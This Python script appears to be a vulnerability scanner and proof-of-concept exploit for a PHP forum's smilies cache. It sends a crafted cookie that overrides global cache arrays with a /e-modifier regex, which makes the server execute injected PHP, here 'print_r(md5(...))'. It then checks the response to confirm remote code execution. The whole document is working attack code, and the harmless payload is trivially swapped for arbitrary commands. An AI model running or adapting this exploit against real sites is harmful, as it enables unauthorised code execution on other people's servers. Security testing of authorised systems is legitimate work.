import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(200000000, 210000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"viewthread.php?tid=10"
	headers={'Cookie': 'GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5('+str(rand)+'));'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(rand).encode()).hexdigest() in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
